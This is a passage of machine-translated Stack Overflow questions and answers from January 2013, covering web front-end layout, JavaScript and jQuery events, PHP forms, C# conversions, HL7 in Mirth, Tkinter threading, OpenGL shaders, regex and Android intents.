**语义：**如果用户禁用了图像怎么办？当然，这不太可能，但是**Google**呢？您应该对真实内容进行适当的标记。您的网站需要真实的文本内容，以便 Google 的抓取工具收集有关它的信息。使用 CSS 图像替换技术来构建界面。

**关于高清显示器的另一个注意事项：** 将较大的图像提供给高清（视网膜）显示器是惯例，并使用 CSS 缩小它们的尺寸，从而有效地增加它们的每英寸点数。如果您只使用一个图像，用户将不得不下载一个*相当大*的图像。您使用的带宽更多，用户体验更慢。

此外，文本在高清显示器上看起来很*糟糕。*允许浏览器向用户呈现锐利的文本更有意义。

**可访问性：**首先，屏幕阅读器不知道您的网站是关于什么的。在这种情况下，这可能不那么相关，但构建和访问网站是最佳实践。如果您想在网站上包含一些较小的文本，某些用户可能无法阅读。通常他们会增加字体大小，但如果你使用图像，他们就无能为力了。

* * *

我可能夸大了这个答案，但这个建议是善意的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-23T02:25:22.117

老实说，我会尝试一些不同的方法。图像的“照片”部分将是一个图像，徽标是另一个图像，并且可能是标题两侧的双条（但可能不是必需的。

我会将照片部分用作 div 上的 bg 图像，其余部分在代码中。

我根本不会将文本作为图像的一部分。尝试使用像[Google Web Fonts](http://www.google.com/webfonts)这样的服务来获得好的字体。

该方法将为您节省大量维护时间，并有助于提高性能。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-22T22:45:04.677

PROS:

*   Total bytes loaded is lower.

*   You do not have to worry about how little images are put together to become the total image.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-22T22:50:05.780

如果您只使用 1 张图像，您会发现保持布局的流动性会容易得多。你不会有填充/对齐问题、渲染问题等。实际上加载时间应该是相同的，对于多个图像可能会更长一点，因为浏览器必须渲染更多的 css，但我想它不会很引人注目。最后，它真的归结为对工作更好的东西。我非常偏向于 1 个干净的图像 :)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-22T22:51:38.837

我想您必须考虑如何单独使用每个元素，以及它们将来将如何变化。

您可能想要更改徽标、为其设置动画或希望在其他地方重新使用它。背景图像可能会改变，或者成为某种过渡画廊中的多个图像。

如果它永远不会改变（不太可能），那么，是的，将它展平在一个图像中。

我个人会将其作为单独的背景图像。然后也许将徽标和标签放在另一个透明 png 上，并利用 css sprite 在整个站点中重复使用它们。这将使下载徽标/标签所需的请求数量减半，并允许您分别优化每个图像，即复杂的背景照片和更简单的徽标/标签。

# javascript - 获取附加到 dom 元素的函数列表

> ID：14469345
> 
> 赞同：0
> 
> 时间：2013-01-22T22:36:54.620
> 
> 标签：javascript, flash, dom, youtube

我正在寻找一种方法来获取当前附加到 javascript 对象（dom 元素）的所有函数。我熟悉[使用`for (var m in obj)`和获取不可枚举的`Object.getOwnPropertyNames()`](https://stackoverflow.com/questions/2257993/how-to-display-all-methods-in-a-javascript-object).

但是，在 youtube.com 上的任何视频页面上`document.getElementById('movie_player')`都有该功能`getVideoBytesTotal`，我尝试过的任何方法都没有列出该功能。

这里讨论的对象是闪存。功能可以来自它吗？

我迷路了。某些 dom 对象周围是否有某种包装器，可以动态添加功能？

即使通过其他方式列出通过控制台输入 javascript 也会很棒。

此致

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T09:49:32.100

这似乎`getVideoBytesTotal`是 API fn [https://developers.google.com/youtube/iframe_api_reference#getVideoBytesTotal](https://developers.google.com/youtube/iframe_api_reference#getVideoBytesTotal)，它可以随时添加到对象中。这意味着可以在您查询后定义它以获取该对象的所有功能...

# php - 在本地和实时之间同步数据库，php mysql

> ID：14469349
> 
> 赞同：1
> 
> 时间：2013-01-22T22:36:58.600
> 
> 标签：php, mysql, database, csv, sync

我正在从事“销售点”项目，这就是我所拥有的：

1.  我有一个本地数据库，可能是 mysql db、csv 文件，甚至是存储客户数据的 xml 文件。
2.  我在自己的服务器上有一个包含完整数据的系统数据库。
3.  在特定时间段后，我想在本地数据库和实时数据库之间同步数据，以更新或插入最新数据。
4.  如果没有互联网，它将保留离线数据，直到互联网恢复并重新开始同步。

我的问题是：

1.  我应该使用哪种本地数据类型（mysql db、csv 文件、xml 文件或其他）？
2.  如何管理这样的同步过程？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T22:41:03.497

如果设备硬件能够在没有性能问题的情况下运行 MySQL 服务器，那么我会在设备和服务器上都使用 MySQL。这将节省不同数据格式之间的转换。您还可以从 MySQL 的[复制](http://dev.mysql.com/doc/refman/5.0/en/replication.html)功能中受益。

# hl7 - A19 HL7 获取患者数据

> ID：14469353
> 
> 赞同：0
> 
> 时间：2013-01-22T22:37:07.673
> 
> 标签：hl7, mirth

我已经搜索了很多关于使用 HL7 使用 mirth 作为服务器发出 A19 请求但无法成功，是否有任何好的教程来制作 HL7 A19 请求查询并将患者数据作为 HL7 获取？

帮助真的很感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-28T18:55:06.807

我已阅读您的问题和评论。我发现很难准确识别您的要求，但我会尽力提供帮助。

听起来你接受什么A19查询消息，然后使用ack消息向发送者提供响应。从表面上看，Mirth 并没有明确说明如何修改 ack 消息的内容，但功能就在那里。

创建单个通道。源将接收 A19 消息，而目标将查询您的数据库以获取所需的信息。后处理器将生成 ack。

在后处理器中，在 return 语句之前添加以下内容。

```
var ackString = 'build a valid ack string here, populating it with data from your db query';
var ackResponse = ResponseFactory.getSuccessResponse(ackString);
responseMap.put("Custom ACK", ackResponse); 
```

现在，转到 Source 选项卡，找到“Send Ack：”选择“Respond from：”“Custom Ack”将是下拉选择器中的一个选项。

我相信您已经知道以下内容：

*   如何解析 A19 消息
*   如何查询你的数据库
*   您的确认消息应如何格式化

# c# - 为什么扩展方法绕过显式转换的需要？

> ID：14469355
> 
> 赞同：0
> 
> 时间：2013-01-22T22:37:16.303
> 
> 标签：c#, language-specifications

我有两个引用类型之间的显式转换设置。

```
class Car
{
    public void Foo(Car car)
    {

    }

    public static explicit operator Bike(Car car)
    {
        return new Bike();
    }

}

class Bike
{

} 
```

如果我调用 Foo 并传递一个 类型`Bike`，那么我必须执行显式转换。

```
 Car myCar = new Car();
            Bike bike = (Bike)myCar;            
            myCar.Foo(bike);//Error: Cannot convert from Bike to Car. 
```

但是，如果我添加扩展方法，则不再需要显式转换。

```
 public static void Foo(this Car car, Bike bike)
        {
            car.Foo(bike);//Success...
        } 
```

为什么扩展方法能够`Bike`隐式调用 Foo 类型？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-22T22:53:13.207

> 为什么扩展方法能够隐式调用具有 Bike 类型的 Foo ？

它不是。您提供的代码会导致编译器错误。

以下至少一项是正确的：

1.  您在此处提供的代码不是您要编译的代码。
2.  您的代码中有一个未在此处添加的隐式转换。
3.  你只是没有真正编译你的代码，也没有注意到它不会编译。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-22T23:01:19.597

现在您已经修改了要显示的代码；

```
public static void Foo(this Car car, Bike bike)
{
    car.Foo(bike);//Success...
} 
```

您所做的只是创建一个具有讽刺意味的 StackOverflowException。这个方法现在只是递归地调用自己，而不是`Foo`in的实现`Car`。

提示：为自己获取一份 ReSharper - 它会在这行代码上放置一个漂亮的圆形箭头图标，以向您展示正在发生的事情，而无需实际编译或运行它。:-)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-22T23:06:33.927

您的显式转换不应该在 Bike 上定义吗？

```
class Bike
{
    public static explicit operator Bike(Car car)
    {
        return new Bike();
    }
} 
```

这允许：

```
Car myCar = new Car();
Bike myBike = (Bike) myCar; 
```

如果您希望能够在不指定转换的情况下执行此操作，则应使用`implicit`关键字。

```
Car myCar = new Car();
Bike myBike = myCar; 
```

最后，你在哪里得到错误`//Error: Cannot convert from Bike to Car.`这表明你需要逆转换......

```
class Car
{
    // FROM Bike TO Car
    public static explicit operator Car(Bike bike)
    {
        return new Car();
    }
} 
```

# php - PHP 5.2 不会回显 <

> ID：14469356
> 
> 赞同：0
> 
> 时间：2013-01-22T22:37:20.450
> 
> 标签：php

我无法让 a`<`进入数组或回显。如果我使用`echo "From: <test@none.net>";`结果是`From:`.

如果我使用

```
$mailheader[] = "From: ".$current_user->display_name." <".$current_user->user_email.">\r\n"; 
$mailheader[] = "Reply-To: ".$current_user->display_name." <".$current_user->user_email.">\r\n"; 

$mailheader[] = "Content-type: text/html; charset=iso-8859-1\r\n"; 

var_dump($mailheader); 
```

结果是

```
array(3) 
{ 
    [0]=> string(37) "From: REMOVED " 
    [1]=> string(41) "Reply-To: REMOVED " 
    [2]=> string(46) "Content-type: text/html; charset=iso-8859-1 "
} 
```

它没有显示以我搜索过的 < 开头的任何内容，但我不明白为什么会这样。我尝试了不同的方法，包括在 < 之前添加一个 \，但它仍然忽略了 < 之后的所有内容。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T22:39:53.307

那是因为`<`并且`>`在 HTML 中具有特殊含义：浏览器认为您正在启动一个 HTML 标记。

如果您想查看变量的实际内容是什么，请查看源代码或`htmlspecialchars`在输出中使用。

# php - 如何使用PHP $_POST 输入与复选框数组相关的文本？

> ID：14469358
> 
> 赞同：0
> 
> 时间：2013-01-22T22:37:28.537
> 
> 标签：php, arrays, forms, input, checkbox

我有一周中的几天的复选框，如下所示：

```
<input type="checkbox" name="day[]" id="monday" value="Monday">
<label for="monday">Monday</label>
<input name="day-detail[]" type="text" />

<input type="checkbox" name="day[]" id="tuesday" value="Tuesday">
<label for="tuesday">Tuesday</label>
<input name="day-detail[]" type="text" /> 
```

等等。

请注意，每天都有相关的输入文本。

我想知道是否只有在选中复选框时才可以打印输入文本字段。我需要使用许多其他复选框多次执行此操作，因此我尝试了以下功能：

```
<?php
function checkboxes($checkbox_field, $default = '') {
    if(isset($_POST[$checkbox_field]) and !empty($_POST[$checkbox_field])) {
        $post_field = $_POST[$checkbox_field];
        if (is_array($post_field)) {
            if(!empty($_POST[$checkbox_field.'-detail'])) {
                return join(', ', $post_field.': '.$_POST[$checkbox_field.'-detail']);
                echo $_POST[$checkbox_field.'-detail'];
            }
            else {
                return join(', ', $post_field);
                echo $_POST[$checkbox_field.'-detail'];
            }
        }
    } else {
        return $default;
    }
}

echo "The weekly sales are:  ".checkboxes('day');
?> 
```

这就是我要打印的内容：

> 星期一：`value from text input`，星期二：`value from text input`"

选中的复选框打印正常，但文本输入不是。

有什么问题？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T22:43:15.823

我认为您需要的是对字段使用索引。因此，假设选择了星期二。然后`$_POST["day"][1]`给你`TRUE`（复选框），并`$_POST["day-detail"][1]`给你相应的文本（即 1 用作两个字段的索引）。

实际上，索引实际上是`for`循环中的一个变量，因为我想象你循环遍历所有复选框。

# jquery - 定位父对象高度

> ID：14469360
> 
> 赞同：0
> 
> 时间：2013-01-22T22:37:43.763
> 
> 标签：jquery

使用 Adob​​e 的 Edge Animate 和 jQuery。

我正在使用 json 文件添加内容并使用调整“舞台”（Edge Animate 的动画内容区域）的高度`$('#Stage').css({'height':newHeight});`

这按预期工作。

当您将动画嵌入网页时，它被放置在“对象”容器中。

`<object id="EdgeID" name="EdgeID" type="text/html" width = "940" height ="1020" data ="../public_html/edgeanimate_assets/import/Assets/import.html"></object>`

我想要做的是覆盖的高度`object#EdgeID`，使其与舞台设置的值相匹配。

`$('#EdgeID').css({'height':newHeight})`从动画脚本内部不起作用。

定位容器的正确方法是什么`(object #EdgeID)`？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-22T22:41:06.830

您需要使用[`.attr()`](http://api.jquery.com/attr/)而不是`.css()`. `height`是元素的属性*，*而`<object>`不是 CSS 样式属性。

```
$('#EdgeID').attr('height', newHeight); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-22T22:42:40.513

由于对象元素使用其`height`属性作为其高度，而不是 CSS 规则，因此您需要直接更改它。尝试：

```
$('#EdgeID').attr('height', newHeight); 
```

`.attr()`文档：[http ://api.jquery.com/attr/](http://api.jquery.com/attr/)

# javascript - 如何仅在用户停止触发事件后触发事件

> ID：14469361
> 
> 赞同：0
> 
> 时间：2013-01-22T22:37:51.627
> 
> 标签：javascript, ajax, google-maps-api-3

如何仅在用户停止使用鼠标后触发事件？因为我不想在缩放期间调用我的 ajax（例如，6 次放大会触发 6 个事件，但我只需要 1 个事件，当放大完成时）

这个函数延迟了执行，然而，它仍然执行所有的事件......

```
 google.maps.event.addListener(map, 'center_changed', function() {
    // 3 seconds after the center of the map has changed
    window.setTimeout(function() {
      myfunction());
    }, 3000);
  }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T22:42:23.820

您可以使用 offsetLeft 和 offsetTop 来计算鼠标光标的 x 和 y 位置，然后在它们在短时间内没有更改后执行您的事件吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T22:56:01.917

```
var lastTriggeredTime;  
google.maps.event.addListener(map, 'center_changed', function() {
    // 3 seconds after the center of the map has changed
    window.setTimeout(function() {
      //set last Triggered Time to now (user is still zooming)
      lastTriggeredTime = (new Date()).getTime();
      myfunction());
    }, 1000);
  });
var myfunction = function(){
  if(lastTriggeredTime + 3000 < (new Date()).getTime()){
    //3 seconds has elapsed since last center_changed event got fired.
  }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-04-27T08:11:48.420

2个解决方案：

```
var cpt = 0;
google.maps.event.addListener(map, 'center_changed', function ()
{
    cpt++;
    var cpt2 = cpt;
    window.setTimeout(function () {
        if (cpt == cpt2) console.log("Task is executed if it is the last event since 3sec");
    }, 3000);
}); 
```

或者

使用事件«空闲»！ [http://gmaps-samples-v3.googlecode.com/svn/trunk/map_events/map_events.html](http://gmaps-samples-v3.googlecode.com/svn/trunk/map_events/map_events.html)

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-01-28T20:47:31.910

我解决了这个问题：

每次触发触发器时，我都会这样做：`clearInterval(trigerFunctionVar);` `trigerFunctionVar=null;`然后将新的间隔添加到`trigerFunctionVar`

# tkinter - 在 tkinter 循环中不断访问线程

> ID：14469362
> 
> 赞同：0
> 
> 时间：2013-01-22T22:37:54.813
> 
> 标签：tkinter, serial-port, updating

我正在尝试制作一个不断绘制从微处理器接收到的信号的 GUI。我试图通过仅使用类来实现这一点，但由于只有 GUI 类是开放的，所以失败了。现在我已经实现了线程（或者至少我认为我有！？）但是每个线程只运行一次。这让我相信我不明白 tkinter 中的 mainloop 是如何工作的，所以我可以重新制作我的代码以使线程变得活跃吗？

```
import Tkinter
import tkMessageBox as messagebox
from serial import *
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
from matplotlib.figure import Figure
import numpy as np
import time
import threading

go=0

x=[0.0001,0.0002,0.0003]
y=[3600,1000,2000]
stid=time.time()

root = Tkinter.Tk()
root.title("Serial gui")

class SensorThread(threading.Thread):
    def run(self):
        global run
        global x
        global y
        global stid
        print "run er ok"
        if go==1:
            print "go er ok"
            ser = Serial(5, 9600, timeout=1)
            f=ser.read(4)
            ser.close()
            x.append(time.time()-stid)
            y.append(f)

class Foo:
    def __init__(self, master):
        print "foo ok"

        frame = Tkinter.Frame(root)

        self.button_left = Tkinter.Button(frame,text="Start",
                                command=self.start)
        self.button_left.pack(side="left")

        self.button_right = Tkinter.Button(frame,text="Stop",
                                command=self.stop)
        self.button_right.pack(side="right")

        self.button_midt = Tkinter.Button(frame, text='Quit', command=self.terminate)
        self.button_midt.pack(side="bottom")

        fig = Figure()
        ax = fig.add_subplot(111, axisbg='black')

        canvas = FigureCanvasTkAgg(fig,master=master)
        canvas.show()
        canvas.get_tk_widget().pack(side='top', fill='both', expand=1)
        frame.pack()

        line1, = ax.plot(x, y, 'r-') # Returns a tuple of line objects, thus the comma
        line1.set_ydata(y)
        fig.canvas.draw()

    def start(self):
        global go
        go=1
        print go

    def stop(self):
        global go
        go=0
        print go

    def terminate(self):
        root.quit()     # stops mainloop
        root.destroy()  # this is necessary on Windows to prevent
                        # Fatal Python Error: PyEval_RestoreThread: NULL tstate

if __name__ == "__main__":
    SensorThread().run()
    Foo(root)
    root.mainloop() 
```

我希望你们中的一些人能帮助我把这段代码变成一个实时更新情节的程序。

超级我在程序中更改了以下内容，

```
class SensorThread(threading.Thread):
def run(self):
    global run
    global x
    global y
    global stid
    #print "run er ok"
    if go==1:
        print "go er ok"
        ser = Serial(17, 9600, timeout=1)
        f=ser.read(4)
        ser.close()
        x.append(time.time()-stid)
        y.append(f)
        SensorThread().start()
    else:
        SensorThread().start()

class Foo:
....

if __name__ == "__main__":
SensorThread().start()
Foo(root)
root.mainloop() 
```

但它仍然没有更新 plottet 的图形，它不应该在 Foo 类中执行此操作吗？现在，当我退出或完全退出 python 脚本时，它仍然使用 50% 的 CPU 功率，可能是因为传感器线程现在永远运行！？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T14:40:50.667

看看这个食谱，它展示了如何做到这一点：

[http://code.activestate.com/recipes/82965-threads-tkinter-and-asynchronous-io/](http://code.activestate.com/recipes/82965-threads-tkinter-and-asynchronous-io/)

# opengl - 如何在几何着色器上实现行进立方体轮廓？

> ID：14469363
> 
> 赞同：0
> 
> 时间：2013-01-22T22:37:57.897
> 
> 标签：opengl

我有一个均匀采样的距离网格：

D(x_i, y_j, z_k)，其中

x_i = x0 + i*dx, 0 <= i < nx

y_j = y0 + j*dy, 0 <= j < ny

z_k = z0 + k*dz, 0 <= k < nz

我想将此网格中的每个单元格传递给几何着色器并输出 0 到 5 个三角形，如行进立方体算法中指定的那样。

我正在考虑使用统一值将 x0、dx、y0、dy、z0、dz 和轮廓值发送到着色器，并将单元格的索引编码为点的位置：

```
glBegin(GL_POINTS);
for(int i = 0; i < nx - 1; i++) {
    for(int j = 0; j < ny - 1; j++) {
        for(int k = 0; k < nz - 1; k++) {
            glVertex3f(i, j, k); 
        }
    }
}
glEnd(); 
```

然而，在几何着色器内部，我必须查找 (i,j,k) 单元格中 8 个角的距离值。如何将 3D 距离数组传递给几何着色器？

# regex - 正则表达式，需要在上次识别时停止

> ID：14469370
> 
> 赞同：0
> 
> 时间：2013-01-22T22:38:16.087
> 
> 标签：regex

我创建了这个正则表达式

```
((char) ([a-zA-Z][a-zA-Z0-9_]*)[,]?([=]?[']?[a-zA-Z0-9.]*?['])?([,]|;))|((int|float) ([a-zA-Z][a-zA-Z0-9_]*)[,]?([=]?[a-zA-Z0-9.]*)?([,]|;)) 
```

它应该识别类型的变量：

```
int a, int a=1, char b, char b='1'; 
```

问题是当我输入

```
int a=1, 
```

它被认为是真实的。有没有办法让 , 符号不被最后一次识别或任何其他解决方法接受？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T22:55:23.513

我测试了这个：

```
(([,]?\s*)(((char)\s([a-zA-Z][a-zA-Z0-9_]*)([=]?[']?[a-zA-Z0-9.]*?[']?))|((int|float) ([a-zA-Z][a-zA-Z0-9_]*)([=]?[a-zA-Z0-9.]*)?)))*[;] 
```

这匹配整个定义行，最后需要一个分号。

如果要匹配代码中的每个定义，可以在正则表达式定义的主体中使用命名组。我不知道您使用的是哪种编程语言，所以我无法为命名组提供更多帮助。

# android - 如何在 android 中使用 Google 图片搜索查询启动浏览器

> ID：14469372
> 
> 赞同：4
> 
> 时间：2013-01-22T22:38:33.080
> 
> 标签：android, google-search-api, google-image-search

我想知道如何使用 Google 图片搜索查询“按文本搜索图片”来启动浏览器。例如，用户可以选择某个单词或短语并单击一个按钮，该活动将使用 Google 图片搜索查询启动浏览器。

提前致谢。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-23T00:09:18.313

***像这样创建 URL：***

```
String URLString = "https://www.google.com/search?hl=en&site=imghp&tbm=isch&source=hp&q="+TestString; 
```

***像这样启动它：***

```
Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(URLString));
startActivity(i); 
```

***确保您的 TestString 是 URL 安全的***

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-05-18T05:12:13.107

只需要添加`tbm=isch`

例子：

网址：`https://www.google.com/search?tbm=isch&q=findSomeImage`

# javascript - 当我将一个表单 ID 传递给 queryselectorall 方法时，我能够看到表单内的所有输入

> ID：14469373
> 
> 赞同：0
> 
> 时间：2013-01-22T22:38:44.917
> 
> 标签：javascript

当我将一个表单 ID 传递给 queryselectorall 方法时，我能够看到表单内的所有输入。但是当我将表单的两个 id 传递给 queryselector 时，我看到它返回了两个表单。有人可以帮我解决这个问题吗？下面是我使用的代码

```
window.$ = function(el) {
    el = document.querySelectorAll(el);
    el.size = el.length;
  if (el.length === 1) {
   el[0].size = 1;
   return el[0];
} else {
  return el;
} 
```

};

完整代码：

```
window.onload=function(){
(function (window) {
    window.Q = function (el) {

        el = document.querySelectorAll(el);
        el.size = el.length;

        if (el.length === 1) {
            el[0].size = 1;
            return el[0];
        } else {
            return el;
        }
    };

    window.addEvents = function (el, ev, fn) {
        var i,
        el = (typeof el == 'string') ? Q(el) : el,
            ev = (ev.indexOf(' ')) ? ev.split(' ') : [ev];

        ev.forEach(function (ea) {
            if (el.length) {
                for (var i = 0; i < el.length; i++) {
                    el[i].addEventListener(ea, fn, false);
                }
            } else {
                console.log(el, ea, fn)
                el.addEventListener(ea, fn, false);
            }
        });
    };
    window.callme = function (e) {
        console.log(e.type)
    }
    window.init = function () {
        /*Below code works when i bind events to one form and all the input fields gets the events attached */
        //window.addEvents('#form1', 'focus keyup blur', callme);
    /* Uncomment the below line to reproduce the issue only the key up event gets fired and that is also getting attached to form and not to form elements*/
        window.addEvents('#form1,#form2', 'focus keyup blur', callme);
    }

})(window);
window.init(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T00:50:22.117

[http://codebins.com/bin/4ldqp6a](http://codebins.com/bin/4ldqp6a)

```
$("#form1 input, #form2 input"); 
```

**编辑：** 我修改了您的问题并包含了您在小提琴中编写的代码。

现在这里的问题不是选择器，而是关于事件冒泡。

事件模糊和焦点不是冒泡事件。所以他们不会冒泡并去找它的父母。
您必须将这些事件附加到元素 itselt。

你可能想看看**focusin、focusout**事件，它们冒泡相当于模糊和焦点。但很少有浏览器支持它。

jquery、dojo 等框架实现了对所有浏览器都有好处的 focusin、focusout 事件。你可以看看他们是如何实现这些的。

# javascript - 当其他信息窗口出现时，关闭不是在循环内创建的全局信息窗口

> ID：14469374
> 
> 赞同：0
> 
> 时间：2013-01-22T22:38:48.037
> 
> 标签：javascript, google-maps, google-maps-api-3, closures, infowindow

我在这里遇到了一个混乱的情况，希望有人可以帮助我解决这个话题已经在 Stackoverflow 中讨论过的事实。

我正在使用循环来读取 XML 并基于该 XML 的节点创建标记，这是可行的。此外，在该循环内，我调用位于该循环外的一个函数，为每个标记创建一个 InfoWindow，其中包含从 XML 中提取的内容。

*   我在循环外部和函数内部创建 InfoWindows，因为如果我不这样做，无论在哪个标记中单击，它总是在地图的最后添加标记上方显示相同的 InfoWindows。
*   如果我定义 InfoWindows 全局所有 InfoWindows 显示最后创建的标记的相同内容。

这是代码：

```
function xml_Leer() {       

    function agregar_datos(marcador, map, direccion, telefono, dias_habiles, sabado, domingo) {
        var datos = new google.maps.InfoWindow({content: "<h2>"+nombre+"</h2><p>"+direccion+"</p><p>"+telefono+"</p><ul><li>Lunes a Viernes: "+dias_habiles+"</li><li>S&aacute;bados: "+sabado+"</li><li>Domingos: "+domingo+"</li></ul>"});
        google.maps.event.addListener(marcador, 'click', function() {datos.open(map,marcador);});
    } 

    var iglesias = xml.getElementsByTagName("iglesia");

    for(var i=0; i<iglesias.length; i++) {
        var nombre = iglesias[i].getElementsByTagName("nombre")[0].childNodes[0].nodeValue;

        var direccion = iglesias[i].getElementsByTagName("direccion")[0].childNodes[0].nodeValue;
        var telefono = iglesias[i].getElementsByTagName("telefono")[0].childNodes[0].nodeValue;

        var dias_habiles = iglesias[i].getElementsByTagName("horarios")[0].getElementsByTagName("dias_habiles")[0].childNodes[0].nodeValue;
        var sabado = iglesias[i].getElementsByTagName("horarios")[0].getElementsByTagName("sabado")[0].childNodes[0].nodeValue;
        var domingo = iglesias[i].getElementsByTagName("horarios")[0].getElementsByTagName("domingo")[0].childNodes[0].nodeValue;

        var tipo = iglesias[i].getAttribute("tipo");

        var ubicacion = new google.maps.LatLng(iglesias[i].getAttribute("lat"), iglesias[i].getAttribute("lng"));

        var marcador = new google.maps.Marker({position: ubicacion, animation: google.maps.Animation.DROP, map: map, title:nombre });

        agregar_datos(marcador, map, direccion, telefono, dias_habiles, sabado, domingo); 
    }

} 
```

如果这没有很好的编码，我应该如何创建 InfoWindow 考虑到我需要从 XML 中获取的信息显示在 InfoWindow 的内容中？

提前致谢。

* * *

此代码有效，但我不知道如何，只是...有效。

```
var datos = new google.maps.InfoWindow();
function agregar_datos(marcador, map, direccion, telefono, dias_habiles, sabado, domingo) {
    var datos = new google.maps.InfoWindow({content: "<h2>"+nombre+"</h2><p>"+direccion+"</p><p>"+telefono+"</p><ul><li>Lunes a Viernes: "+dias_habiles+"</li><li>S&aacute;bados: "+sabado+"</li><li>Domingos: "+domingo+"</li></ul>"});
    google.maps.event.addListener(marcador, 'click', function() { if(window.datos){window.datos.close();} window.datos=datos; datos.open(map,marcador);});
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T22:57:59.393

我怀疑这是因为 javascript 关闭问题，看这里，这是完全相同的问题！ [https://stackoverflow.com/a/8326203/684229](https://stackoverflow.com/a/8326203/684229)

您有问题，因为当 marcador click 事件处理程序启动时，它使用`marcador`函数调用中的变量，但这已经更改为 for 循环中的最后一个标记。

只需尝试更改函数中的代码`agregar_datos()`以使用`this`而不是`marcador`：

```
google.maps.event.addListener(marcador, 'click', function() {datos.open(map, this);}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T23:39:29.580

创建 1 个全局变量，用于存储最后打开的信息窗口。当你打开一个新的 infoWindow 时，你可以访问这个全局变量并关闭窗口：

**在全球范围内的某处：**

```
var datos; 
```

**在 agregar_datos() 中：**

删除第二行并添加：

```
google.maps.event.addListener(marcador, 'click', 
   function() {
     if(window.datos){window.datos.close();}
     window.datos=datos;
     datos.open(map,marcador);
}); 
```

* * *

更好的解决方案：仅使用 1 个 infoWindow：

**在全球范围内的某处：**

```
var datos=new google.maps.InfoWindow(); 
```

**在 agregar_datos() 中：**

删除行：

```
var datos = new google.maps.InfoWindow(/*....*/); 
```

并添加：

```
google.maps.event.addListener(marcador, 'click', 
       function() {
         window.datos.close();
         window.datos.setContent("put your content here");
         datos.open(map,marcador);
    }); 
```

# javascript - 如何将文本添加为 jqplot canvasOverlay？

> ID：14469385
> 
> 赞同：6
> 
> 时间：2013-01-22T22:39:29.723
> 
> 标签：javascript, jquery, canvas, jqplot

我想在 jqplot 图表上叠加一个标签。标签应包含文本或理想情况下的任何标记。我检查了[文档](http://www.jqplot.com/docs/files/usage-txt.html)和[示例](http://www.jqplot.com/deploy/dist/examples/)，在 jqplot 主图表区域中找不到任意标签的示例。

jqplot的相关特性：[canvasOverlay](http://www.jqplot.com/docs/files/plugins/jqplot-canvasOverlay-js.html)用于在图表上绘制任意线条。此外，“标题”标签存在，但位于图表之外。

看起来这应该很简单。一些选项：

1.  更改主标签的 jqplot CSS 以将其移动到图表内。
2.  jqplot 中的新标签。
3.  问题范围确实在 jqplot 之外，正确的解决方案是使用 Canvas 通用的。

提前致谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-25T23:35:45.607

找到了一个解决方案，由 jqplot 作者 Chris Leonello 在 2010 年发布到谷歌群组：[https ://groups.google.com/forum/?fromgroups=#!topic/jqplot-users/GDZW4BsDMiA](https://groups.google.com/forum/?fromgroups=#!topic/jqplot-users/GDZW4BsDMiA)

Chris 的解决方案是将此行放在 plot1 代码之后，它对我来说效果很好。

`mytitle = $('<div class="my-jqplot-title" style="position:absolute;text-align:center;padding-top: 15px;width:100%">My Custom Chart Title</div>').insertAfter('.jqplot-grid-canvas');`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-23T00:22:55.163

尝试在 HTML5 Canvas 中执行此操作，如下所示：

```
<script type="text/javascript">
window.addEventListener('load', function () {
  // Get the canvas element.
  var elem = document.getElementById('chart1');
  if (!elem || !elem.getContext) {
    return;
  }

  // Get the canvas 2d context.
  var context = elem.getContext('2d');
  if (!context) {
    return;
  }

  // Let's draw "Hello world!" in blue.
  context.fillStyle    = '#00f';

  // The font property is like the CSS font property.
  context.font         = 'italic 30px sans-serif';
  context.textBaseline = 'top';

  if (context.fillText) {
    context.fillText('Hello world!', 0, 0);
  }

  // It looks like WebKit doesn't support the strokeText method.
  // Tested on Ubuntu 8.10 Linux in WebKitGTK revision 38095 (2008-11-04, svn 
  // trunk build).
  context.font = 'bold 30px sans-serif';
  if (context.strokeText) {
    context.strokeText('Hello world!', 0, 50);
  }
}, false);
</script> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-06-15T14:49:38.503

您可以使用 HTML 标签强制图表上的标题：

```
title = {
  text : "<div style='top:20px; left:80px; position:absolute; z-index:55;'>YOUR TITLE HERE</div>",
  show : true,
  fontSize : '12pt',
  textAlign : 'left',
  textColor : '#333',
  escapeHtml : false,
} 
```

# haskell - 存在类型和类型类实例

> ID：14469392
> 
> 赞同：1
> 
> 时间：2013-01-22T22:39:55.693
> 
> 标签：haskell

我正在为 Haskell 开发 Hadoop 库，但遇到了一些我似乎无法解决的存在类型和类型类问题。我的代码如下：

```
type Mapper k1 v1 k2 v2 = k1 -> v1 -> IO [(k2,v2)]

type Reducer k1 v1 k2 v2 = k1 -> [v1] -> IO [(k2,v2)]

